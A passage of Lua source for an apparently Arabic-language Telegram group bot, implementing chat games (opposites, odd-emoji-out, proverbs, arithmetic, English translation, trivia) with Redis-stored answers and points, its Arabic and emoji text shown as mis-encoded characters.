Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end 
if text == 'Ψ§ΩΨΉΩΨ³' and ChCheck(msg) or text == 'ΨΉΩΨ³' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {'Ψ¨Ψ§Ω','ΩΩΩΨͺ','ΩΩΨ²ΩΩ','Ψ§Ψ³ΩΨΉΩ','Ψ§Ψ­Ψ¨Ω','ΩΩΨ­ΩΩ','ΩΨΆΩΩ','Ψ­Ψ§Ψ±Ω','ΩΨ§Ψ΅Ω','Ψ¬ΩΩ','Ψ³Ψ±ΩΨΉ','ΩΩΨ³Ω','Ψ·ΩΩΩ','Ψ³ΩΩΩ','ΨΆΨΉΩΩ','Ψ΄Ψ±ΩΩ','Ψ΄Ψ¬Ψ§ΨΉ','Ψ±Ψ­Ψͺ','ΨΉΨ―Ω','ΩΨ΄ΩΨ·','Ψ΄Ψ¨ΨΉΨ§Ω','ΩΩΨΉΨ·Ψ΄Ψ§Ω','Ψ?ΩΨ΄ ΩΩΨ―','Ψ§ΩΩ','ΩΨ§Ψ―Ψ¦'}
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum3'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'Ψ¨Ψ§Ω','ΩΩΩ')
name = string.gsub(name,'ΩΩΩΨͺ','ΩΨ§ΩΩΩΨͺ')
name = string.gsub(name,'ΩΩΨ²ΩΩ','Ψ²ΩΩ')
name = string.gsub(name,'Ψ§Ψ³ΩΨΉΩ','ΩΨ§Ψ³ΩΨΉΩ')
name = string.gsub(name,'Ψ§Ψ­Ψ¨Ω','ΩΨ§Ψ­Ψ¨Ω')
name = string.gsub(name,'ΩΨ­ΩΩ','Ψ­ΩΩ')
name = string.gsub(name,'ΩΨΆΩΩ','ΩΨ΅Ψ?')
name = string.gsub(name,'Ψ­Ψ§Ψ±Ω','Ψ¨Ψ§Ψ±Ψ―Ω')
name = string.gsub(name,'ΩΨ§Ψ΅Ω','ΨΉΨ§ΩΩ')
name = string.gsub(name,'Ψ¬ΩΩ','ΩΩΩ')
name = string.gsub(name,'Ψ³Ψ±ΩΨΉ','Ψ¨Ψ·ΩΨ‘')
name = string.gsub(name,'ΩΩΨ³Ω','ΨΆΩΨ¬Ω')
name = string.gsub(name,'Ψ·ΩΩΩ','ΩΨ²Ω')
name = string.gsub(name,'Ψ³ΩΩΩ','ΨΆΨΉΩΩ')
name = string.gsub(name,'ΨΆΨΉΩΩ','ΩΩΩ')
name = string.gsub(name,'Ψ΄Ψ±ΩΩ','ΩΩΨ§Ψ―')
name = string.gsub(name,'Ψ΄Ψ¬Ψ§ΨΉ','Ψ¬Ψ¨Ψ§Ω')
name = string.gsub(name,'Ψ±Ψ­Ψͺ','Ψ§Ψ¬ΩΨͺ')
name = string.gsub(name,'Ψ­Ω','ΩΩΨͺ')
name = string.gsub(name,'ΩΨ΄ΩΨ·','ΩΨ³ΩΩ')
name = string.gsub(name,'Ψ΄Ψ¨ΨΉΨ§Ω','Ψ¬ΩΨΉΨ§Ω')
name = string.gsub(name,'ΩΩΨΉΨ·Ψ΄Ψ§Ω','ΨΉΨ·Ψ΄Ψ§Ω')
name = string.gsub(name,'Ψ?ΩΨ΄ ΩΩΨ―','ΩΩΨ?ΩΨ΄ ΩΩΨ―')
name = string.gsub(name,'Ψ§ΩΩ','ΩΨ·Ω')
name = string.gsub(name,'ΩΨ§Ψ―Ψ¦','ΨΉΨ΅Ψ¨Ω')
mustafaTEAM = 'β β« ΩΨ§ ΩΩ ΨΉΩΨ³ ΩΩΩΨ© β '..name
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum3'..msg.chat_id_) and not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
mustafaTEAM = 'β β« ΩΨ¨ΩΩΩΨ±ΩΩΪͺ ΩΩΪ Ωΰ’ͺΨ¨Ψ­ΩΨͺ ΩΩΩΩ° Ψ’ΩΩΨΉΨ¨ΩΩΩΩΫ π? \nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β Ψ§ΩΨΉΩΨ³ ΩΩΨΉΩΨ¨ ΩΩΩΰ’ͺΩΫ Ψ§Ϋ£Ψ?ΰ’ͺΩ πΉ'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end 
if text == 'Ψ§ΩΩΨ?ΨͺΩΩ' and ChCheck(msg) or text == 'ΩΨ?ΨͺΩΩ' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {'πΈ','β ','πΌ','π','π','π','β­οΈ','π₯','β','π₯','βοΈ','π¨βπ¬','π¨βπ»','π¨βπ§','π©βπ³','π§ββ','π§ββοΈ','π§ββ','πββ','π§ββ','π¬','π¨βπ¨βπ§','π','π€','βοΈ','π','π©ββοΈ','π¨βπ¨'};
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum4'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'πΈ','πΉπΉπΉπΈπΉπΉπΉπΉ')
name = string.gsub(name,'β οΈ','πππβ οΈππππ')
name = string.gsub(name,'πΌ','π»π»π»π»π»π»π»πΌ')
name = string.gsub(name,'π','ππππππππ')
name = string.gsub(name,'π','ππππππππ')
name = string.gsub(name,'π','ππππππππ')
name = string.gsub(name,'β­οΈ','ππππππβ­οΈπ')
name = string.gsub(name,'π₯','π«π«π«π₯π«π«π«π«')
name = string.gsub(name,'β','π¨π¨π¨βπ¨π¨π¨π¨')
name = string.gsub(name,'π₯','βοΈβοΈβοΈπ₯βοΈβοΈβοΈβοΈ')
name = string.gsub(name,'βοΈ','βοΈβοΈβοΈβοΈβοΈβοΈβοΈβοΈβοΈ')
name = string.gsub(name,'π¨βπ¬','π©βπ¬π©βπ¬π©βπ¬π©βπ¬π©βπ¬π¨βπ¬π©βπ¬π©βπ¬')
name = string.gsub(name,'π¨βπ»','π©βπ»π©βπ»π¨βπ»π©βπ»π©βπ»π©βπ»π©βπ»π©βπ»')
name = string.gsub(name,'π¨βπ§','π©βπ§π©βπ§π©βπ§π©βπ§π©βπ§π©βπ§π¨βπ§π©βπ§')
name = string.gsub(name,'π©βπ³','π¨βπ³π¨βπ³π©βπ³π¨βπ³π¨βπ³π¨βπ³π¨βπ³π¨βπ³')
name = string.gsub(name,'π§ββοΈ','π§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈ')
name = string.gsub(name,'π§ββοΈ','π§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈ')
name = string.gsub(name,'π§ββοΈ','π§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈ')
name = string.gsub(name,'πββοΈ','πββοΈπββοΈπββοΈπββοΈπββοΈπββοΈπββοΈπββοΈ')
name = string.gsub(name,'π§ββοΈ','π§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈπ§ββοΈ')
name = string.gsub(name,'π¬','π­π­π­π­π¬π­π­π­')
name = string.gsub(name,'π¨βπ¨βπ§','π¨βπ¨βπ¦π¨βπ¨βπ¦π¨βπ¨βπ¦π¨βπ¨βπ¦π¨βπ¨βπ¦π¨βπ¨βπ§π¨βπ¨βπ¦π¨βπ¨βπ¦')
name = string.gsub(name,'π','ππππππππ')
name = string.gsub(name,'π€','π₯π₯π₯π₯π₯π€π₯π₯')
name = string.gsub(name,'βοΈ','β³β³β³β³β³βοΈβ³β³')
name = string.gsub(name,'π','ππππππππ')
name = string.gsub(name,'π©ββοΈ','π¨ββοΈπ¨ββοΈπ¨ββοΈπ¨ββοΈπ¨ββοΈπ©ββοΈπ¨ββοΈπ¨ββοΈ')
name = string.gsub(name,'π¨βπ¨','π©βπ¨π©βπ¨π¨βπ¨π©βπ¨π©βπ¨π©βπ¨π©βπ¨π©βπ¨')
mustafaTEAM = 'β β« Ψ§ΩΩ ΩΨ’Ψ­ΩΪ ΩΨ·ΩΨΉ Ψ§ΩΩΨ?ΨͺΩΩ ΩΩ°Ωΰ’ͺΨ¨Ψ­\n{'..name..'} '
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum4'..msg.chat_id_) and not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
mustafaTEAM = 'β β« ΩΨ¨ΩΩΩΨ±ΩΩΪͺ ΩΩΪ Ωΰ’ͺΨ¨Ψ­ΩΨͺ ΩΩΩΩ° Ψ’ΩΩΨΉΨ¨ΩΩΩΩΫ π? \nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β Ψ§ΩΩΨ?ΨͺΩΩ ΩΩΨΉΩΨ¨ ΩΩΩΰ’ͺΩΫ Ψ§Ϋ£Ψ?ΰ’ͺΩ πΉ'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end  
if text == 'Ψ§ΩΨ«ΩΩ' and ChCheck(msg) or text == 'Ψ§ΩΨ§ΩΨ«ΩΩ' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {
'Ψ¬ΩΨ²','ΨΆΨ±Ψ§Ψ·Ω','Ψ§ΩΨ­Ψ¨Ω','Ψ§ΩΨ­Ψ§ΩΩΩΩ°','Ψ΄ΩΨ±Ω','Ψ¨ΩΨ―Ω','Ψ³ΩΨ§ΩΩ','Ψ§ΩΩΨ?ΩΩ','Ψ§ΩΨ?ΩΩ','Ψ­Ψ―Ψ§Ψ―','Ψ§ΩΩΨ¨ΩΩ','ΩΨ±ΩΨ΅','ΩΨ±Ψ―','Ψ§ΩΨΉΩΨ¨','Ψ§ΩΨΉΩΩ','Ψ§ΩΨ?Ψ¨Ψ²','Ψ¨Ψ§ΩΨ­Ψ΅Ψ§Ψ―','Ψ΄ΩΨ±','Ψ΄ΩΩ','ΩΩΨ­ΩΩ',
};
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum5'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'Ψ¬ΩΨ²','ΩΩΨ·Ω ___ ΩΩΩΨ§ΨΉΩΨ―Ω Ψ³ΩΩΩ')
name = string.gsub(name,'ΨΆΨ±Ψ§Ψ·Ω','Ψ§ΩΩ ΩΨ³ΩΩ Ψ§ΩΩΨ·Ω ΩΨͺΨ­ΩΩ ___ ')
name = string.gsub(name,'Ψ¨ΩΨ―Ω','Ψ§ΩΩ ___ ΩΨ­Ψ― ΩΩΩΩΩ°Ψ―Ω')
name = string.gsub(name,'Ψ§ΩΨ­Ψ§ΩΩΩΩ°','ΨͺΨ¬Ψ―Ω ΩΩ ___ ΩΨΉΨ§Ω')
name = string.gsub(name,'Ψ΄ΩΨ±Ω','ΩΨΉ Ψ§ΩΨ?ΩΩ ΩΨ§ ___ ')
name = string.gsub(name,'Ψ§ΩΩΨ?ΩΩ','Ψ§ΩΨ·ΩΩ Ψ·ΩΩ ___ ΩΨ§ΩΨΉΩΩ ΨΉΩΩ Ψ§ΩΨ΅Ψ?ΩΨ©')
name = string.gsub(name,'Ψ³ΩΨ§ΩΩ','Ψ¨Ψ§ΩΩΨ¬Ω Ψ§ΩΨ±Ψ§ΩΨ© ΩΨ¨Ψ§ΩΨΈΩΨ± ___ ')
name = string.gsub(name,'Ψ§ΩΨ?ΩΩ','ΩΩ ΩΩΨ© ___ Ψ΄Ψ―Ω ΨΉΩΩ Ψ§ΩΪΩΨ§Ψ¨ Ψ³Ψ±ΩΨ¬')
name = string.gsub(name,'Ψ­Ψ―Ψ§Ψ―','ΩΩΩΩ ΩΩ Ψ΅Ψ?Ω ΩΨ¬ΩΩ ΩΨ§Ω Ψ’ΩΩ ___ ')
name = string.gsub(name,'Ψ§ΩΩΨ¨ΩΩ',' ___ ΩΨ§ ΩΨ?Ψ§Ω ΩΩ Ψ§ΩΩΨ·Ψ±')
name = string.gsub(name,'Ψ§ΩΨ­Ψ¨Ω','Ψ§ΩΩΩ ΨͺΩΨ―ΨΊΨ© Ψ§ΩΨ­ΩΨ© ΩΨ?Ψ§Ω ΩΩ Ψ¬Ψ±Ψ© ___ ')
name = string.gsub(name,'ΩΨ±ΩΨ΅','Ψ§ΩΩΨ§ΩΨΉΨ±Ω ___ ΩΩΩΩ Ψ§ΩΩΨ§ΨΉ ΨΉΩΨ¬Ω')
name = string.gsub(name,'Ψ§ΩΨΉΩΨ¨','Ψ§ΩΩΨ§ΩΩΩΨ­ ___ ΩΩΩΩ Ψ­Ψ§ΩΨΆ')
name = string.gsub(name,'Ψ§ΩΨΉΩΩ','___ Ψ₯Ψ°Ψ§ Ψ­Ψ¨Ψͺ Ψ§ΩΪΩΨ© Ψ§Ψ¨ΩΩΨ³ ΩΨ―Ψ?Ω Ψ§ΩΨ¬ΩΨ©')
name = string.gsub(name,'Ψ§ΩΨ?Ψ¨Ψ²','Ψ§ΩΨ·Ω ___ ΩΩΨ?Ψ¨Ψ§Ψ² Ψ­ΨͺΩ ΩΩ ΩΨ§ΩΩ ΩΨ΅Ω')
name = string.gsub(name,'Ψ¨Ψ§ΩΨ­Ψ΅Ψ§Ψ―','Ψ§Ψ³ΩΨ© ___ ΩΩΩΨ¬ΩΩ ΩΩΨ³ΩΨ±')
name = string.gsub(name,'Ψ΄ΩΨ±','Ψ§ΩΨ΄Ω ___ ΩΩΨ§ ΨͺΨΉΨ¨Ψ± ΩΩΨ±')
name = string.gsub(name,'Ψ΄ΩΩ','ΩΨ§ΩΩ ΨͺΨΉΨ¨ ΩΨ§ΩΩ ___ ΩΨ§ ΩΩ ΨΉΩΩ Ψ§ΩΨ­Ψ§ΨΆΨ± ΩΩΨ©')
name = string.gsub(name,'Ψ§ΩΩΨ±Ψ―',' ___ Ψ¨ΨΉΩΩ Ψ§ΩΩ ΨΊΨ²Ψ§Ω')
name = string.gsub(name,'ΩΩΨ­ΩΩ','Ψ§Ψ¬Ω ___ ΨΉΩΨ§ΩΨ§')
mustafaTEAM = 'β β« Ψ§ΩΩΩ Ψ§ΩΩΨ«Ψ§Ω Ψ§ΩΨͺΨ§ΩΩ β ['..name..']'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum5'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
Devmfm:del(mustafa..'mfm:GameNum5'..msg.chat_id_)
mustafaTEAM = 'β β« ΩΨ¨ΩΩΩΨ±ΩΩΪͺ ΩΩΪ Ωΰ’ͺΨ¨Ψ­ΩΨͺ ΩΩΩΩ° Ψ’ΩΩΨΉΨ¨ΩΩΩΩΫ π? \nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β Ψ§ΩΨ«ΩΩ ΩΩΨΉΩΨ¨ ΩΩΩΰ’ͺΩΫ Ψ§Ϋ£Ψ?ΰ’ͺΩ πΉ'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end  
if text == 'Ψ±ΩΨ§ΨΆΩΨ§Ψͺ' and ChCheck(msg) or text == 'Ψ§ΩΨ±ΩΨ§ΨΆΩΨ§Ψͺ' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum6'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'9','7 + 2 = ?')
name = string.gsub(name,'46','41 + 5 = ?')
name = string.gsub(name,'2','5 - 3 = ?')
name = string.gsub(name,'9','5 + 2 + 2 = ?')
name = string.gsub(name,'5','8 - 3 = ?')
name = string.gsub(name,'4','40 Γ· 10 = ?')
name = string.gsub(name,'25','30 - 5 = ?')
name = string.gsub(name,'10','100 Γ· 10 = ?')
name = string.gsub(name,'17','10 + 5 + 2 = ?')
name = string.gsub(name,'15','25 - 10 = ?')
name = string.gsub(name,'39','44 - 5 = ?')
name = string.gsub(name,'5','12 + 1 - 8 = ?')
name = string.gsub(name,'16','16 + 16 - 16 = ?')
mustafaTEAM = 'β β« Ψ§ΩΩΩ Ψ§ΩΩΨΉΨ§Ψ―ΩΩ Ψ§ΩΨͺΨ§ΩΩΩ β β₯‘\n{'..name..'} '
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum6'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
Devmfm:del(mustafa..'mfm:GameNum6'..msg.chat_id_)
mustafaTEAM = 'β β« ΩΨ¨ΩΩΩΨ±ΩΩΪͺ ΩΩΪ Ωΰ’ͺΨ¨Ψ­ΩΨͺ ΩΩΩΩ° Ψ’ΩΩΨΉΨ¨ΩΩΩΩΫ π? \nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β Ψ±ΩΨ§ΨΆΩΨ§Ψͺ ΩΩΨΉΩΨ¨ ΩΩΩΰ’ͺΩΫ Ψ§Ϋ£Ψ?ΰ’ͺΩ πΉ'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end  
if text == 'Ψ§ΩΨ§ΩΩΩΩΨ²Ω' and ChCheck(msg) or text == 'Ψ§ΩΨ§ΩΨ¬ΩΩΨ²ΩΩ' and ChCheck(msg) or text == 'Ψ§ΩΩΩΩΨ²ΩΩ' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {'ΩΨΉΩΩΩΨ§Ψͺ','ΩΩΩΨ§Ψͺ','ΩΨ¬ΩΩΨΉΨ§Ψͺ','ΩΨͺΨ§Ψ¨','ΨͺΩΨ§Ψ­Ω','Ψ³Ψ―ΩΩ','ΩΩΩΨ―','Ψ§ΨΉΩΩ','Ψ°Ψ¦Ψ¨','ΨͺΩΨ³Ψ§Ψ­','Ψ°ΩΩ','Ψ΄Ψ§Ψ·Ψ¦','ΨΊΨ¨Ω',};
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum7'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'Ψ°Ψ¦Ψ¨','Wolf')
name = string.gsub(name,'ΩΨΉΩΩΩΨ§Ψͺ','Information')
name = string.gsub(name,'ΩΩΩΨ§Ψͺ','Channels')
name = string.gsub(name,'ΩΨ¬ΩΩΨΉΨ§Ψͺ','Groups')
name = string.gsub(name,'ΩΨͺΨ§Ψ¨','Book')
name = string.gsub(name,'ΨͺΩΨ§Ψ­Ω','Apple')
name = string.gsub(name,'ΩΩΩΨ―','money')
name = string.gsub(name,'Ψ§ΨΉΩΩ','I know')
name = string.gsub(name,'ΨͺΩΨ³Ψ§Ψ­','crocodile')
name = string.gsub(name,'Ψ΄Ψ§Ψ·Ψ¦','Beach')
name = string.gsub(name,'ΨΊΨ¨Ω','Stupid')
name = string.gsub(name,'Ψ΅Ψ―Ψ§ΩΩ','Friendchip')
mustafaTEAM = 'β β« ΩΨ§ ΩΨΉΩΩ ΩΩΩΨ© β '..name
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum7'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
Devmfm:del(mustafa..'mfm:GameNum7'..msg.chat_id_)
mustafaTEAM = 'β β« ΩΨ¨ΩΩΩΨ±ΩΩΪͺ ΩΩΪ Ωΰ’ͺΨ¨Ψ­ΩΨͺ ΩΩΩΩ° Ψ’ΩΩΨΉΨ¨ΩΩΩΩΫ π? \nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β Ψ§ΩΩΩΩΨ²ΩΩ ΩΩΨΉΩΨ¨ ΩΩΩΰ’ͺΩΫ Ψ§Ϋ£Ψ?ΰ’ͺΩ πΉ'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end  
--     Source Escobar     --
if text == 'Ψ§Ψ³Ψ¦ΩΩ' and ChCheck(msg) or text == 'Ψ§Ψ?ΨͺΩΨ§Ψ±Ψ§Ψͺ' and ChCheck(msg) or text == 'Ψ§ΩΨ§Ψ³Ψ¦ΩΩ' and ChCheck(msg) or text == 'Ψ§Ψ³Ψ§ΩΩ' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {'Ψ§ΩΩΩΩ','14','Ψ§ΩΩΩ','11','30','Ψ¨ΩΨͺΩΩ','Ψ³ΨͺΩΩ Ψ¬ΩΨ¨Ψ±','Ψ¨Ψ§Ψ±ΩΨ³','10','Ψ§ΩΩΩΩ','Ψ­Ψ±Ω Ψ§ΩΩΨ§Ω','Ψ§ΩΨ΄ΨΉΨ±','Ψ³Ψ­Ψ§Ψ¨','Ψ§ΩΨ§Ψ³Ω','Ψ°ΩΨ¨','Ψ­Ψ±Ω Ψ§ΩΨ§Ω','Ψ§ΩΨΉΨ²Ψ§Ψ¦Ω','Ψ§ΩΨ³Ψ§Ψͺ','Ψ§ΩΩΩΨ¬ΩΩΩ','Ψ§Ψ³ΩΨ§','6','Ψ§ΩΨ§Ψ³Ψ―','ΩΩΨ±','Ψ§ΩΨ―ΩΩΩΩΩΩ°Ω','Ψ§ΩΨ±ΩΨ¨Ψ§','Ψ§ΩΨ²Ψ¦Ψ¨Ω','ΩΩΨ―Ω','Ψ§ΩΨ§ΩΨ³Ψ§Ω','Ψ§Ψ³ΩΩΨ¨Ψ§Ψ±','Ψ?Ψ―ΩΨ¬Ω',}
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum8'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'Ψ§ΩΩΩΩ','β β« ΩΨ§ΩΩ Ψ§Ψ·ΩΩ ΩΩΨ± ΩΩΩΩ° Ψ§ΩΨΉΨ§ΩΩ Ψ\n1- Ψ§ΩΩΩΩ\n2- Ψ§ΩΩΨ±Ψ§Ψͺ\n3- ΩΩΨ± Ψ§ΩΩΩΩΨΊΩ')
name = string.gsub(name,'14','β β« ΩΨ§ΨΉΨ―Ψ― ΨΉΨΈΨ§Ω Ψ§ΩΩΨ¬Ω Ψ\n1- 15\n2- 13\n3- 14')
name = string.gsub(name,'Ψ§ΩΩΩ','β β« ΩΨ±Ψ§Ψ³Ω Ψ¨ΩΨΆΨ§Ψ‘ ΩΨ¬Ψ―Ψ±Ψ§Ω ΩΨ±Ψ―ΩΩ Ψ§Ψ°Ψ§ Ψ§ΨΊΩΩΨͺΩ Ψ§Ψ΅Ψ¨Ψ­ ΨΈΩΨ§Ω  ΩΩΩ Ψ§ΩΩΩ Ψ\n1- Ψ§ΩΩΩ\n2- Ψ§ΩΨ§Ψ°Ω\n3- Ψ§ΩΨ«ΩΨ§Ψ¬Ω')
name = string.gsub(name,'11','β β« ΩΩ Ψ¬Ψ²Ψ‘ ΩΨ­ΨͺΩΩ ΩΨ³ΩΨ³Ω ΩΨ§Ψ―Ω Ψ§ΩΨ°Ψ¦Ψ§Ψ¨ Ψ\n1- 7\n2- 15\n3- 11')
name = string.gsub(name,'30','β β« ΩΩ Ψ¬Ψ²Ψ‘ ΩΨ­ΨͺΩΩ Ψ§ΩΩΨ±Ψ§Ω Ψ§ΩΩΨ±ΩΩ Ψ\n1- 60\n2- 70\n3- 30')
name = string.gsub(name,'Ψ¨ΩΨͺΩΩ','β β« ΩΩ ΩΩΩ Ψ§ΨΊΩΩ Ψ±Ψ¦ΩΨ³ ΩΩΩΩ° Ψ§ΩΨΉΨ§ΩΩ Ψ\n1- ΨͺΨ±Ψ§ΩΨ¨\n2- Ψ§ΩΨ¨Ψ§ΩΨ§\n3- Ψ¨ΩΨͺΩΩ')
name = string.gsub(name,'Ψ³ΨͺΩΩ Ψ¬ΩΨ¨Ψ±','β β« ΩΩ ΩΩΩ ΩΨ€Ψ³Ψ³ Ψ΄Ψ±ΩΩ Ψ§Ψ¨Ω Ψ§ΩΨΉΨ§ΩΩΩΩ  Ψ\n1- ΩΨ§Ψ±Ω Ψ¨Ψ§ΩΨ¬\n2- Ψ¨ΩΩ Ψ¬ΩΨͺΨ³\n3- Ψ³ΨͺΩΩ Ψ¬ΩΨ¨Ψ±')
name = string.gsub(name,'Ψ¨Ψ§Ψ±ΩΨ³','ΩΨ§ΩΩ ΨΉΨ§Ψ΅ΩΩ ΩΨ±ΩΨ³Ψ§ Ψ\n1- Ψ¨Ψ§Ψ±ΩΨ³\n2- ΩΩΩΩ\n3- ΩΩΨ³ΩΩ')
name = string.gsub(name,'10','β β« ΩΨ§ΨΉΨ―Ψ― Ψ―ΩΩ Ψ§ΩΨΉΨ±Ψ¨ΩΩ Ψ§ΩΨͺΩ ΨͺΩΨ¬Ψ― ΩΩΩΩ° Ψ§ΩΨ±ΩΩΩΨ§ Ψ\n1- 10\n2- 17\n3- 9')
name = string.gsub(name,'Ψ§ΩΩΩΩ','β β« ΩΨ§ΩΩ Ψ§ΩΨ­ΩΩΨ§Ω Ψ§ΩΨ°Ω ΩΨ­ΩΩ 50 ΩΩΩ ΩΨ²ΩΩ Ψ\n1- Ψ§ΩΩΩΩΩ°Ω\n2- Ψ§ΩΩΩΩ\n3- Ψ§ΩΨ«ΩΨ±')
name = string.gsub(name,'Ψ­Ψ±Ω Ψ§ΩΩΨ§Ω','β β« ΩΨ§Ψ°Ψ§ ΩΩΨ¬Ψ― Ψ¨ΩΩΩ ΩΨ¨ΩΩΩ Ψ\n1- Ψ§ΩΨΆΩ\n2- Ψ§ΩΨ§Ψ?ΩΨ§Ω\n3- Ψ­Ψ±Ω Ψ§ΩΩΨ§Ω')
name = string.gsub(name,'Ψ§ΩΨ΄ΨΉΨ±','β β« ΩΨ§ΩΩ Ψ§ΩΨ΄ΩΨ‘ Ψ§ΩΩΨ¨Ψ§Ψͺ ΩΩΨ¨Ψͺ ΩΩΨ§ΩΨ³Ψ§Ω Ψ¨ΩΨ§ Ψ¨Ψ°Ψ± Ψ\n1- Ψ§ΩΨ§ΨΆΨ§ΩΨ±\n2- Ψ§ΩΨ§Ψ³ΩΨ§Ω\n3- Ψ§ΩΨ΄ΨΉΨ±')
name = string.gsub(name,'Ψ³Ψ­Ψ§Ψ¨','β β« ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΩΨ‘ Ψ§ΩΨ°Ω ΩΨ³ΨͺΨ·ΩΨΉ Ψ§ΩΩΨ΄Ω Ψ¨Ψ―ΩΩ Ψ£Ψ±Ψ¬Ω ΩΨ§ΩΨ¨ΩΨ§Ψ‘ Ψ¨Ψ―ΩΩ Ψ£ΨΉΩΩ Ψ\n1- Ψ³Ψ­Ψ§Ψ¨\n2- Ψ¨Ψ¦Ψ±\n3- ΩΩΨ±')
name = string.gsub(name,'Ψ§ΩΨ§Ψ³Ω','β β« ΩΨ§ Ψ§ΩΨ΄ΩΨ‘ Ψ§ΩΨ°Ω ΩΩΨͺΩΩΩ , ΩΩΩΩ ΨΊΩΨ±ΩΨ§ ΩΨ³ΨͺΨΉΩΩΩ Ψ£ΩΨ«Ψ± ΩΩΩΨ§ Ψ\n1- Ψ§ΩΨΉΩΨ±\n2- Ψ³Ψ§ΨΉΩ\n3- Ψ§ΩΨ§Ψ³Ω')
